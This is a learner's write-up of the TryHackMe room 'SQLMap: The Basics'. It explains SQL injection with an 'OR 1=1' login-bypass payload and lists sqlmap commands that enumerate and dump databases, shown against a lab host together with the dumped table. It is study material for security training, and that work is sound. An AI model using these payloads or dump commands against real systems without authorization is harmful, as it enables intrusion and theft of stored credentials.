
### **TryHackMe: Cyber Security 101**

**Room:** `SQLMap: The Basics`  
**Status:** Completed  
**Date:** 2025-08-20

----------

### **Goal**

Understand the fundamentals of SQL injection, learn how SQLMap automates detection and exploitation of SQL injection vulnerabilities, and practice extracting database information from a vulnerable web application.

---------

### **Key Topics Covered**


## Key Topics Covered

### 1. Databases and SQL

Databases are structured collections of data that can be stored, modified, and retrieved efficiently. Websites and applications use databases to manage user information, such as login credentials and other application data. These databases are managed by Database Management Systems (DBMS) such as MySQL, PostgreSQL, SQLite, or Microsoft SQL Server, which understand SQL (Structured Query Language). Applications interact with the database by sending SQL queries.

For example, when a user logs into a website, the site might execute a query like:

    SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';

This query checks whether a user named John exists and whether the provided password matches. If both conditions are true, the database returns the user’s details to the application.

### 2. SQL Injection

SQL injection occurs when user input is not properly sanitized, allowing an attacker to manipulate SQL queries. This can lead to unauthorized access to sensitive information stored in databases.

For example, entering the following in a password field:

    abc' OR 1=1;-- -

would transform the original query into:

    SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';

Here’s the reasoning behind this injection:

-   The `OR 1=1` condition is always true, bypassing the need for the correct password.
    
-   The `-- -` comments out any remaining part of the original query, preventing syntax errors.
    
-   The single quote `'` ensures that the injected code is interpreted correctly within the SQL statement.
    

This allows attackers to log in as any user without knowing the password, demonstrating the severity of SQL injection vulnerabilities.

### 3. SQLMap Overview

SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabilities. It simplifies the identification of weak points in web applications. The basic workflow involves:

1.  **Finding a vulnerable URL or request**:
    
    -   GET-based testing uses parameters in the URL to retrieve data.
        
    -   Example:

              sqlmap -u http://sqlmaptesting.thm/search/cat=1

  This command identifies possible SQL injection types on the target URL.
        
-   **Enumerating databases, tables, and records**:
    
    -   List databases:

            sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs

	- List tables in a database:

            sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
	
	- Dump table contents:

            sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users -T thomas --dump

**POST-based testing**:

-   Used for login or registration forms where data is sent in the request body.
    
-   Requires intercepting the request and saving it as a text file:

          sqlmap -r intercepted_request.txt

### 4. Practical Exercise: Testing a Vulnerable Site

I tested a fake vulnerable site provided by TryHackMe with a login form. My steps included:

1.  Opened the developer tools and navigated to the Network tab.
    
2.  Submitted the login form to capture the GET request:

          http://10.10.186.52/ai/includes/user_login?email=email&password=password

3.  Used SQLMap commands to explore the database:
    

-   **Retrieve databases**:

        sqlmap -u 'http://10.10.186.52/ai/includes/user_login?email=email&password=password' --dbs

-   Output included: `ai`, `mysql`, `performance_schema`, `phpmyadmin`, `test`.
    
-   **List tables in the `ai` database**:

          sqlmap -u 'http://10.10.186.52/ai/includes/user_login?email=email&password=password' -D ai --tables

-   Output: `user`
    
-   **Dump table contents**:

          sqlmap -u 'http://10.10.186.52/ai/includes/user_login?email=email&password=password' -D ai -T user --dump

      Output:

        +------+-----------------+---------------------+------------+
        | id   | email           | created             | password   |
        +------+-----------------+---------------------+------------+
        | 1    | test@chatai.com | 2023-02-21 09:05:46 | 12345678   |
        +------+-----------------+---------------------+------------+


This practical reinforced how SQL injection vulnerabilities can be identified and exploited using SQLMap.

## What I Learned

-   SQL injection exploits improperly sanitized user input to manipulate database queries.
    
-   SQLMap automates detection, enumeration, and exploitation of SQL injection vulnerabilities.
    
-   GET and POST parameters can be tested differently depending on how data is sent.
    
-   Practical testing allows retrieving databases, table names, and table contents from vulnerable applications.
